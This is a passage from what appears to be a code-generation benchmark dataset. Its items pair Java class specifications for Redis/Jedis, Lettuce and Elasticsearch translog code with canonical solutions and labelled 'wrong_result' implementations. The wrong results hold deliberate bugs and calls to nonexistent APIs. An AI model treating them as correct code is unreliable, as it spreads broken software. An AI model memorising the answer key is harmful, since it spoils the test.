}\n\n    public boolean isBroken() {\n        return broken;\n    }\n\n    public void setBroken() {\n        broken = true;\n    }\n\n    public void sendCommand(ProtocolCommand command, byte[]... args) {\n        try {\n            outputStream.write(command.getBytes());\n            for (byte[] arg : args) {\n                outputStream.write(arg);\n            }\n            outputStream.flush();\n        } catch (IOException e) {\n            setBroken();\n        }\n    }\n\n    public Object getOne() {\n        try {\n            return readProtocolWithCheckingBroken();\n        } catch (IOException e) {\n            setBroken();\n            return null;\n        }\n    }\n\n    public void flush() {\n        try {\n            outputStream.flush();\n        } catch (IOException e) {\n            setBroken();\n        }\n    }\n\n    private Object readProtocolWithCheckingBroken() throws IOException {\n        if (isBroken()) {\n            throw new IOException(\"Connection is broken\");\n        }\n        return inputStream.readProtocol();\n    }\n\n    @Override\n    public void close() {\n        disconnect();\n    }\n}"
  },
  {
    "Task_id": 316,
    "Instruction": "Task Description: Implement a Redis Sentinel-based connection provider in Java that can discover and connect to the current Redis master node through Sentinel servers.\n\nClass Description: SentineledConnectionProvider is a utility class that manages Redis connections in a Sentinel environment. It discovers the current master node through Sentinel servers and establishes connections to it.\n\nAttributes:\n- masterName: String - The name of the Redis master node as configured in Sentinel\n- masterConfig: JedisClientConfig - Configuration for connecting to the Redis master\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- sentinelConfig: JedisClientConfig - Configuration for connecting to Sentinel servers\n\nMethods:\n- getConnection() -> Connection - Discovers the current master node through Sentinel and returns an established connection to it\n- discoverMaster() -> HostAndPort - Internal method that queries Sentinel servers to find the current master node's address\n- close() -> void - Cleans up any resources (currently a placeholder for future implementation)\n\nInput: \n- Constructor parameters:\n  - masterName: String\n  - masterConfig: JedisClientConfig\n  - sentinels: Set<HostAndPort>\n  - sentinelConfig: JedisClientConfig\n\nOutput:\n- getConnection() returns a connected Connection object to the current Redis master\n- discoverMaster() returns the HostAndPort of the current master node\n- close() has no return value",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.HashSet;\n\npublic class SentineledConnectionProvider {\n\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig,\n                                      Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        try {\n            HostAndPort master = discoverMaster();\n            Connection connection = new Connection(master, masterConfig);\n            connection.connect();\n            return connection;\n        } catch (JedisException e) {\n            throw new JedisConnectionException(\"Failed to get connection from sentinel\", e);\n        }\n    }\n\n    private HostAndPort discoverMaster() {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(sentinel, sentinelConfig)) {\n                String masterHost = jedis.sentinelGetMasterAddrByName(masterName).get(0);\n                int masterPort = Integer.parseInt(jedis.sentinelGetMasterAddrByName(masterName).get(1));\n                return new HostAndPort(masterHost, masterPort);\n            } catch (Exception e) {\n                continue;\n            }\n        }\n        throw new JedisException(\"Could not discover master from sentinels\");\n    }\n\n    public void close() {\n        // Cleanup resources if needed\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class SentineledConnectionProvider {\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig, Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        HostAndPort master = discoverMaster();\n        Jedis jedis = new Jedis(master.getHost(), master.getPort(), masterConfig.getTimeout());\n        return jedis;\n    }\n\n    private HostAndPort discoverMaster() {\n        for (HostAndPort sentinel : sentinels) {\n            Jedis jedis = new Jedis(sentinel.getHost(), sentinel.getPort(), sentinelConfig.getTimeout());\n            List<String> masterInfo = jedis.sentinelGetMaster(masterName);\n            if (masterInfo != null && masterInfo.get(0).equals(masterName)) {\n                String ip = masterInfo.get(1);\n                int port = Integer.parseInt(masterInfo.get(2));\n                return new HostAndPort(ip, port);\n            }\n        }\n        throw new RuntimeException(\"Could not find master\");\n    }\n\n    public void close() {\n        // Placeholder for future implementation\n    }\n}"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Create a singleton Redis client class that manages a single Redis connection instance throughout the application lifecycle, with automatic shutdown handling.\n\nClass Description: DefaultRedisClient is a singleton class that provides centralized Redis client management. It creates and maintains a single RedisClient instance, configures default timeout settings, and ensures proper resource cleanup during JVM shutdown.\n\nAttributes:\n- instance: DefaultRedisClient - The singleton instance of the class\n- redisClient: RedisClient - The underlying Redis client connection instance\n\nMethods:\n- get() -> RedisClient - Returns the singleton RedisClient instance after setting a default timeout of 60 seconds\n- DefaultRedisClient() (constructor) - Private constructor that initializes the RedisClient with connection settings and registers a shutdown hook\n- run() (in anonymous Thread class) - Shutdown hook method that cleans up Redis client resources during JVM shutdown",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.TimeUnit;\n\npublic class DefaultRedisClient {\n\n    private static final DefaultRedisClient instance = new DefaultRedisClient();\n\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = RedisClient.create(RedisURI.Builder.redis(TestSettings.host(), TestSettings.port()).build());\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            @Override\n            public void run() {\n                FastShutdown.shutdown(redisClient);\n            }\n        });\n    }\n\n    public static RedisClient get() {\n        instance.redisClient.setDefaultTimeout(60, TimeUnit.SECONDS);\n        return instance.redisClient;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class DefaultRedisClient {\n    private static DefaultRedisClient instance;\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = new RedisClient(60);\n        Runtime.getRuntime().addShutdownHook(new Thread(this::run));\n    }\n\n    public static RedisClient get() {\n        if (instance == null) {\n            instance = new DefaultRedisClient();\n        }\n        return instance.redisClient;\n    }\n\n    private void run() {\n        if (redisClient != null) {\n            redisClient.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a TranslogReader class that handles reading operations from a transaction log (translog) file in Elasticsearch, including managing file channels, checkpoints, and ensuring thread-safe operations.\n\nClass Description: The TranslogReader class extends BaseTranslogReader and implements Closeable, providing functionality to read from a translog file while maintaining checkpoint information and ensuring proper resource management. It handles file channel operations, checkpoint updates, and provides thread-safe closing mechanisms.\n\nAttributes:\n- length: long - The length of the translog file in bytes.\n- totalOperations: int - The total number of operations recorded in the translog.\n- checkpoint: Checkpoint - The checkpoint information containing metadata about the translog state.\n- closed: AtomicBoolean - Thread-safe flag indicating whether the reader is closed.\n\nMethods:\n- TranslogReader(Checkpoint, FileChannel, Path, TranslogHeader) -> [Constructor] - Initializes a new TranslogReader with the given checkpoint, file channel, path, and translog header.\n- open(FileChannel, Path, Checkpoint, String) -> TranslogReader - Static method to open and initialize a TranslogReader instance with the specified parameters.\n- closeIntoTrimmedReader(long, ChannelFactory) -> TranslogReader - Closes the current reader and returns a new trimmed reader based on the specified sequence number, updating the checkpoint if necessary.\n- readBytes(ByteBuffer, long) -> void - Reads bytes from the translog file into the provided buffer at the specified position, with bounds checking.\n- close() -> void - Closes the file channel and marks the reader as closed in a thread-safe manner.\n- isClosed() -> boolean - Returns whether the reader is closed.\n- ensureOpen() -> void - Throws an AlreadyClosedException if the reader is closed.",
    "Canonical_solution": "import org.apache.lucene.store.AlreadyClosedException;\nimport org.elasticsearch.common.io.Channels;\nimport io.crate.common.io.IOUtils;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\n\nimport java.io.Closeable;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\nimport static org.elasticsearch.index.translog.Translog.getCommitCheckpointFileName;\n\npublic class TranslogReader extends BaseTranslogReader implements Closeable {\n    protected final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    protected final AtomicBoolean closed = new AtomicBoolean(false);\n\n    TranslogReader(final Checkpoint checkpoint, final FileChannel channel, final Path path, final TranslogHeader header) {\n        super(checkpoint.generation, channel, path, header);\n        this.length = checkpoint.offset;\n        this.totalOperations = checkpoint.numOps;\n        this.checkpoint = checkpoint;\n    }\n\n    public static TranslogReader open(\n            final FileChannel channel, final Path path, final Checkpoint checkpoint, final String translogUUID) throws IOException {\n        final TranslogHeader header = TranslogHeader.read(translogUUID, path, channel);\n        return new TranslogReader(checkpoint, channel, path, header);\n    }\n\n    TranslogReader closeIntoTrimmedReader(long aboveSeqNo, ChannelFactory channelFactory) throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            Closeable toCloseOnFailure = channel;\n            final TranslogReader newReader;\n            try {\n                if (aboveSeqNo < checkpoint.trimmedAboveSeqNo\n                    || aboveSeqNo < checkpoint.maxSeqNo && checkpoint.trimmedAboveSeqNo == SequenceNumbers.UNASSIGNED_SEQ_NO) {\n                    final Path checkpointFile = path.getParent().resolve(getCommitCheckpointFileName(checkpoint.generation));\n                    final Checkpoint newCheckpoint = new Checkpoint(checkpoint.offset, checkpoint.numOps,\n                        checkpoint.generation, checkpoint.minSeqNo, checkpoint.maxSeqNo,\n                        checkpoint.globalCheckpoint, checkpoint.minTranslogGeneration, aboveSeqNo);\n                    Checkpoint.write(channelFactory, checkpointFile, newCheckpoint, StandardOpenOption.WRITE);\n\n                    IOUtils.fsync(checkpointFile, false);\n                    IOUtils.fsync(checkpointFile.getParent(), true);\n\n                    newReader = new TranslogReader(newCheckpoint, channel, path, header);\n                } else {\n                    newReader = new TranslogReader(checkpoint, channel, path, header);\n                }\n                toCloseOnFailure = null;\n                return newReader;\n            } finally {\n                IOUtils.close(toCloseOnFailure);\n            }\n        } else {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n\n    protected void readBytes(ByteBuffer buffer, long position) throws IOException {\n        if (position >= length) {\n            throw new EOFException(\"read requested past EOF. pos [\" + position + \"] end: [\" + length + \"]\");\n        }\n        if (position < getFirstOperationOffset()) {\n            throw new IOException(\"read requested before position of first ops. pos [\" + position + \"] first op on: [\" + getFirstOperationOffset() + \"]\");\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, buffer);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            channel.close();\n        }\n    }\n\n    protected final boolean isClosed() {\n        return closed.get();\n    }\n\n    protected void ensureOpen() {\n        if (isClosed()) {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class TranslogReader extends BaseTranslogReader implements Closeable {\n    private final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n    private final FileChannel channel;\n    private final Path path;\n    private final TranslogHeader header;\n\n    public TranslogReader(Checkpoint checkpoint, FileChannel channel, Path path, TranslogHeader header) {\n        this.checkpoint = checkpoint;\n        this.channel = channel;\n        this.path = path;\n        this.header = header;\n        this.length = channel.size();\n        this.totalOperations = header.getTotalOperations();\n    }\n\n    public static TranslogReader open(FileChannel channel, Path path, Checkpoint checkpoint, String... args) {\n        TranslogHeader header = new TranslogHeader(checkpoint);\n        return new TranslogReader(checkpoint, channel, path, header);\n    }\n\n    public TranslogReader closeIntoTrimmedReader(long sequenceNumber, ChannelFactory factory) {\n        close();\n        Checkpoint newCheckpoint = new Checkpoint(sequenceNumber, checkpoint.getTimestamp());\n        return new TranslogReader(newCheckpoint, factory.createChannel(path), path, header);\n    }\n\n    public void readBytes(ByteBuffer buffer, long position) {\n        if (position >= length) {\n            throw new IllegalArgumentException(\"Position exceeds file length\");\n        }\n        channel.read(buffer, position);\n    }\n\n    @Override\n    public void close() {\n        if (closed.get()) {\n            throw new AlreadyClosedException(\"Reader is already closed\");\n        }\n        try {\n            if (channel != null) {\n                channel.close();\n            }\n        } finally {\n            closed.set(true);\n        }\n    }\n\n    public boolean isClosed() {\n        return closed.get();\n    }\n\n    public void ensureOpen() {\n        if (closed.get()) {\n            throw new AlreadyClosedException(\"Reader is closed\");\n        }\n    }\n}"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a Java class that manages authentication and operations for a Redis cluster using Jedis client library, with support for token-based authentication and connection pooling.\n\nClass Description: RedisClusterAuthManager is a class that handles Redis cluster authentication and operations. It provides methods to execute basic Redis operations and test re-authentication functionality in a multi-threaded environment.\n\nAttributes:\n- idpConfig: [IdentityProviderConfig] - Configuration for the identity provider that generates authentication tokens\n- authXManager: [AuthXManager] - Manager responsible for handling authentication processes\n- config: [JedisClientConfig] - Configuration for the Jedis client\n- poolConfig: [ConnectionPoolConfig] - Configuration for the connection pool\n- hostAndPort: [HostAndPort] - Redis cluster endpoint information\n\nMethods:\n- RedisClusterAuthManager([HostAndPort hostAndPort]) -> [void] - Constructor that initializes the authentication manager with Redis cluster endpoint\n- executeRedisOperations() -> [void] - Executes basic Redis operations (set, get, delete) on the cluster\n- testReAuthentication() -> [void] - Tests re-authentication functionality in a multi-threaded environment, verifying that connections properly re-authenticate",
    "Canonical_solution": "import redis.clients.authentication.core.IdentityProvider;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.SimpleToken;\nimport redis.clients.authentication.core.Token;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPoolConfig;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.EndpointConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisCluster;\n\npublic class RedisClusterAuthManager {\n\n    private final IdentityProviderConfig idpConfig;\n    private final AuthXManager authXManager;\n    private final JedisClientConfig config;\n    private final ConnectionPoolConfig poolConfig;\n    private final HostAndPort hostAndPort;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.idpConfig = new IdentityProviderConfig() {\n            @Override\n            public IdentityProvider getProvider() {\n                return new IdentityProvider() {\n                    @Override\n                    public Token requestToken() {\n                        return new SimpleToken(\"default\", \"cluster\",\n                                System.currentTimeMillis() + 5 * 1000, System.currentTimeMillis(),\n                                null);\n                    }\n                };\n            }\n        };\n        this.authXManager = new AuthXManager(EntraIDTokenAuthConfigBuilder.builder()\n                .lowerRefreshBoundMillis(1000).identityProviderConfig(idpConfig).build());\n        this.config = DefaultJedisClientConfig.builder().authXManager(authXManager).build();\n        this.poolConfig = new ConnectionPoolConfig();\n    }\n\n    public void executeRedisOperations() {\n        try (JedisCluster jc = new JedisCluster(hostAndPort, config, 5, poolConfig)) {\n            jc.set(\"foo\", \"bar\");\n            jc.get(\"foo\");\n            jc.del(\"foo\");\n        }\n    }\n\n    public void testReAuthentication() throws InterruptedException, ExecutionException {\n        AuthXManager spyManager = spy(authXManager);\n        List<Connection> connections = new ArrayList<>();\n        \n        doAnswer(invocation -> {\n            Connection connection = spy((Connection) invocation.getArgument(0));\n            invocation.getArguments()[0] = connection;\n            connections.add(connection);\n            Object result = invocation.callRealMethod();\n            return result;\n        }).when(spyManager).addConnection(any(Connection.class));\n\n        JedisClientConfig spyConfig = DefaultJedisClientConfig.builder().authXManager(spyManager).build();\n        \n        ExecutorService executorService = Executors.newFixedThreadPool(2);\n        CountDownLatch latch = new CountDownLatch(1);\n        \n        try (JedisCluster jc = new JedisCluster(Collections.singleton(hostAndPort), spyConfig)) {\n            Runnable task = () -> {\n                while (latch.getCount() > 0) {\n                    jc.set(\"foo\", \"bar\");\n                }\n            };\n            Future task1 = executorService.submit(task);\n            Future task2 = executorService.submit(task);\n\n            await().pollInterval(ONE_HUNDRED_MILLISECONDS).atMost(ONE_SECOND)\n                    .until(connections::size, greaterThanOrEqualTo(2));\n\n            connections.forEach(conn -> {\n                verify(conn, atLeast(2)).reAuthenticate();\n            });\n            \n            latch.countDown();\n            task1.get();\n            task2.get();\n        } finally {\n            latch.countDown();\n            executorService.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.HostAndPort;\n\npublic class RedisClusterAuthManager {\n    private IdentityProviderConfig idpConfig;\n    private AuthXManager authXManager;\n    private JedisClientConfig config;\n    private ConnectionPoolConfig poolConfig;\n    private HostAndPort hostAndPort;\n    private JedisPool jedisPool;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.idpConfig = new IdentityProviderConfig(); // Assume proper initialization\n        this.authXManager = new AuthXManager(); // Assume proper initialization\n        this.config = new JedisClientConfig(); // Assume proper initialization\n        this.poolConfig = new ConnectionPoolConfig(); // Assume proper initialization\n        this.jedisPool = new JedisPool(poolConfig, hostAndPort);\n    }\n\n    public void executeRedisOperations() {\n        try (Jedis jedis = jedisPool.getResource()) {\n            jedis.set(\"testKey\", \"testValue\");\n            String value = jedis.get(\"testKey\");\n            jedis.delete(\"testKey\");\n        }\n    }\n\n    public void testReAuthentication() {\n        Thread[] threads = new Thread[5];\n        for (int i = 0; i < threads.length; i++) {\n            threads[i] = new Thread(() -> {\n                try (Jedis jedis = jedisPool.getResource()) {\n                    // Simulate re-authentication check\n                    if (authXManager.isTokenValid(idpConfig)) {\n                        jedis.set(\"reauthKey\", \"reauthValue\");\n                    } else {\n                        String newToken = authXManager.reauthenticate(idpConfig);\n                        jedis.auth(newToken);\n                        jedis.set(\"reauthKey\", \"reauthValue\");\n                    }\n                } catch (Exception e) {\n                    // Handle re-authentication failure\n                    e.printStackTrace();\n                }\n            });\n        }\n        for (Thread t : threads) {\n            t.start();\n        }\n        try {\n            for (Thread t : threads) {\n                t.join();\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Implement a Redis cluster command executor in Java that handles command execution with retry logic, connection management, and error handling for a Redis cluster environment.\n\nClass Description: ClusterCommandExecutor is a Redis cluster command executor that provides functionality to execute commands across a Redis cluster with support for retries, connection pooling, and handling of various Redis cluster-specific exceptions.\n\nAttributes:\n- provider: ClusterConnectionProvider - Manages connections to the Redis cluster nodes\n- maxAttempts: int - Maximum number of retry attempts for command execution\n- maxTotalRetriesDuration: Duration - Maximum duration for all retry attempts\n- log: Logger - Logger instance for debugging and error logging\n\nMethods:\n- close() -> void - Closes the connection provider and releases resources\n- broadcastCommand(CommandObject<T> commandObject) -> T - Executes a command across all nodes in the cluster and collects responses/errors\n- executeCommand(CommandObject<T> commandObject) -> T - Executes a command on the primary node with retry logic\n- executeCommandToReplica(CommandObject<T> commandObject) -> T - Executes a command on a replica node with retry logic\n- doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) -> T - Internal method handling the execution logic with retries and error handling\n- execute(Connection connection, CommandObject<T> commandObject) -> T - Executes a command on a specific connection\n- handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) -> boolean - Handles connection issues with backoff and slot cache renewal\n- getBackoffSleepMillis(int attemptsLeft, Instant deadline) -> long - Calculates backoff sleep duration for retries\n- sleep(long sleepMillis) -> void - Sleeps for the specified milliseconds, handling interruptions",
    "Canonical_solution": "import redis.clients.jedis.CommandObject;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.exceptions.*;\nimport redis.clients.jedis.providers.ClusterConnectionProvider;\nimport redis.clients.jedis.util.IOUtils;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.Map;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.TimeUnit;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ClusterCommandExecutor implements CommandExecutor {\n\n  private final Logger log = LoggerFactory.getLogger(getClass());\n\n  public final ClusterConnectionProvider provider;\n  protected final int maxAttempts;\n  protected final Duration maxTotalRetriesDuration;\n\n  public ClusterCommandExecutor(ClusterConnectionProvider provider, int maxAttempts,\n      Duration maxTotalRetriesDuration) {\n    this.provider = provider;\n    this.maxAttempts = maxAttempts;\n    this.maxTotalRetriesDuration = maxTotalRetriesDuration;\n  }\n\n  @Override\n  public void close() {\n    this.provider.close();\n  }\n\n  @Override\n  public final <T> T broadcastCommand(CommandObject<T> commandObject) {\n    Map<String, ConnectionPool> connectionMap = provider.getConnectionMap();\n\n    boolean isErrored = false;\n    T reply = null;\n    JedisBroadcastException bcastError = new JedisBroadcastException();\n    for (Map.Entry<String, ConnectionPool> entry : connectionMap.entrySet()) {\n      HostAndPort node = HostAndPort.from(entry.getKey());\n      ConnectionPool pool = entry.getValue();\n      try (Connection connection = pool.getResource()) {\n        T aReply = execute(connection, commandObject);\n        bcastError.addReply(node, aReply);\n        if (isErrored) {\n        } else if (reply == null) {\n          reply = aReply;\n        } else if (reply.equals(aReply)) {\n        } else {\n          isErrored = true;\n          reply = null;\n        }\n      } catch (Exception anError) {\n        bcastError.addReply(node, anError);\n        isErrored = true;\n      }\n    }\n    if (isErrored) {\n      throw bcastError;\n    }\n    return reply;\n  }\n\n  @Override\n  public final <T> T executeCommand(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, false);\n  }\n\n  public final <T> T executeCommandToReplica(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, true);\n  }\n\n  private <T> T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {\n    Instant deadline = Instant.now().plus(maxTotalRetriesDuration);\n\n    JedisRedirectionException redirect = null;\n    int consecutiveConnectionFailures = 0;\n    Exception lastException = null;\n    for (int attemptsLeft = this.maxAttempts; attemptsLeft > 0; attemptsLeft--) {\n      Connection connection = null;\n      try {\n        if (redirect != null) {\n          connection = provider.getConnection(redirect.getTargetNode());\n          if (redirect instanceof JedisAskDataException) {\n            connection.executeCommand(Protocol.Command.ASKING);\n          }\n        } else {\n          connection = toReplica ? provider.getReplicaConnection(commandObject.getArguments())\n              : provider.getConnection(commandObject.getArguments());\n        }\n\n        return execute(connection, commandObject);\n\n      } catch (JedisClusterOperationException jnrcne) {\n        throw jnrcne;\n      } catch (JedisConnectionException jce) {\n        lastException = jce;\n        ++consecutiveConnectionFailures;\n        log.debug(\"Failed connecting to Redis: {}\", connection, jce);\n        boolean reset = handleConnectionProblem(attemptsLeft - 1, consecutiveConnectionFailures, deadline);\n        if (reset) {\n          consecutiveConnectionFailures = 0;\n          redirect = null;\n        }\n      } catch (JedisRedirectionException jre) {\n        if (lastException == null || lastException instanceof JedisRedirectionException) {\n          lastException = jre;\n        }\n        log.debug(\"Redirected by server to {}\", jre.getTargetNode());\n        consecutiveConnectionFailures = 0;\n        redirect = jre;\n        if (jre instanceof JedisMovedDataException) {\n          provider.renewSlotCache(connection);\n        }\n      } finally {\n        IOUtils.closeQuietly(connection);\n      }\n      if (Instant.now().isAfter(deadline)) {\n        throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n      }\n    }\n\n    JedisClusterOperationException maxAttemptsException\n        = new JedisClusterOperationException(\"No more cluster attempts left.\");\n    maxAttemptsException.addSuppressed(lastException);\n    throw maxAttemptsException;\n  }\n\n  protected <T> T execute(Connection connection, CommandObject<T> commandObject) {\n    return connection.executeCommand(commandObject);\n  }\n\n  private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) {\n    if (this.maxAttempts < 3) {\n      if (attemptsLeft == 0) {\n        provider.renewSlotCache();\n        return true;\n      }\n      return false;\n    }\n\n    if (consecutiveConnectionFailures < 2) {\n      return false;\n    }\n\n    sleep(getBackoffSleepMillis(attemptsLeft, doneDeadline));\n    provider.renewSlotCache();\n    return true;\n  }\n\n  private static long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {\n    if (attemptsLeft <= 0) {\n      return 0;\n    }\n\n    long millisLeft = Duration.between(Instant.now(), deadline).toMillis();\n    if (millisLeft < 0) {\n      throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n    }\n\n    long maxBackOff = millisLeft / (attemptsLeft * attemptsLeft);\n    return ThreadLocalRandom.current().nextLong(maxBackOff + 1);\n  }\n\n  protected void sleep(long sleepMillis) {\n    try {\n      TimeUnit.MILLISECONDS.sleep(sleepMillis);\n    } catch (InterruptedException e) {\n      throw new JedisClusterOperationException(e);\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class ClusterCommandExecutor {  \n    private final ClusterConnectionProvider provider;  \n    private final int maxAttempts;  \n    private final Duration maxTotalRetriesDuration;  \n    private final Logger log;  \n\n    public void close() {  \n        provider.close();  \n    }  \n\n    public <T> T broadcastCommand(CommandObject<T> commandObject) {  \n        List<Connection> nodes = provider.getNodes();  \n        for (Connection node : nodes) {  \n            try {  \n                return execute(node, commandObject);  \n            } catch (Exception e) {  \n                log.error(\"Failed to execute command on node\", e);  \n            }  \n        }  \n        throw new RuntimeException(\"Failed to execute command on all nodes\");  \n    }  \n\n    public <T> T executeCommand(CommandObject<T> commandObject) {  \n        return doExecuteCommand(commandObject, false);  \n    }  \n\n    public <T> T executeCommandToReplica(CommandObject<T> commandObject) {  \n        return doExecuteCommand(commandObject, true);  \n    }  \n\n    private <T> T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {  \n        int attemptsLeft = maxAttempts;  \n        int consecutiveConnectionFailures = 0;  \n        Instant deadline = Instant.now().plus(maxTotalRetriesDuration);  \n        while (attemptsLeft > 0) {  \n            try {  \n                Connection connection = toReplica ? provider.getConnectionToReplica() : provider.getConnectionToPrimary();  \n                T result = execute(connection, commandObject);  \n                return result;  \n            } catch (Exception e) {  \n                boolean handled = handleConnectionProblem(attemptsLeft, consecutiveConnectionFailures, deadline);  \n                if (handled) {  \n                    consecutiveConnectionFailures = 0;  \n                    attemptsLeft--;  \n                    long sleepMillis = getBackoffSleepMillis(attemptsLeft, deadline);  \n                    sleep(sleepMillis);  \n                } else {  \n                    throw e;  \n                }  \n            } catch (RuntimeException e) {  \n                boolean handled = handleConnectionProblem(attemptsLeft, consecutiveConnectionFailures, deadline);  \n                if (handled) {  \n                    consecutiveConnectionFailures = 0;  \n                    attemptsLeft--;  \n                    long sleepMillis = getBackoffSleepMillis(attemptsLeft, deadline);  \n                    sleep(sleepMillis);  \n                } else {  \n                    throw e;  \n                }  \n            }  \n        }  \n        throw new RuntimeException(\"Exceeded maximum retry attempts\");  \n    }  \n\n    private <T> T execute(Connection connection, CommandObject<T> commandObject) {  \n        return connection.execute(commandObject);  \n    }  \n\n    private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) {  \n        if (consecutiveConnectionFailures >= maxAttempts) {  \n            return false;  \n        }  \n        provider.renewSlotCache();  \n        return true;  \n    }  \n\n    private long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {  \n        long sleepMillis = (long) Math.pow(2, attemptsLeft - 1) * 1000;  \n        if (sleepMillis > maxTotalRetriesDuration.toMillis()) {  \n            sleepMillis = maxTotalRetriesDuration.toMillis();  \n        }  \n        return Math.min(sleepMillis, deadline.toEpochMilli() - System.currentTimeMillis());  \n    }  \n\n    private void sleep(long sleepMillis) {  \n        try {  \n            Thread.sleep(sleepMillis);  \n        } catch (InterruptedException e) {  \n            Thread.currentThread().interrupt();  \n            throw new RuntimeException(\"Sleep interrupted\", e);  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 323,
    "Instruction": "Task Description: Create a Java class that implements a socket factory for establishing connections to Redis servers, supporting both regular and SSL/TLS connections with configurable timeouts and hostname verification.\n\nClass Description: DefaultJedisSocketFactory is a socket factory implementation for Redis client connections that handles both plain and SSL/TLS sockets, with support for connection timeouts, socket timeouts, host shuffling, and hostname verification.\n\nAttributes:\n- hostAndPort: HostAndPort - The Redis server address and port\n- connectionTimeout: int - Connection timeout in milliseconds\n- socketTimeout: int - Socket timeout in milliseconds\n- ssl: boolean - Flag indicating whether to use SSL/TLS\n- sslSocketFactory: SSLSocketFactory - Factory for creating SSL sockets\n- sslParameters: SSLParameters - SSL/TLS parameters\n- hostnameVerifier: HostnameVerifier - Hostname verifier for SSL/TLS\n- hostAndPortMapper: HostAndPortMapper - Mapper for host and port addresses\n\nMethods:\n- DefaultJedisSocketFactory() -> void - Default constructor using default host and port\n- DefaultJedisSocketFactory(HostAndPort hostAndPort) -> void - Constructor with specified host and port\n- DefaultJedisSocketFactory(JedisClientConfig config) -> void - Constructor with client configuration\n- DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) -> void - Constructor with both host/port and configuration\n- connectToFirstSuccessfulHost(HostAndPort hostAndPort) -> Socket - Internal method to establish 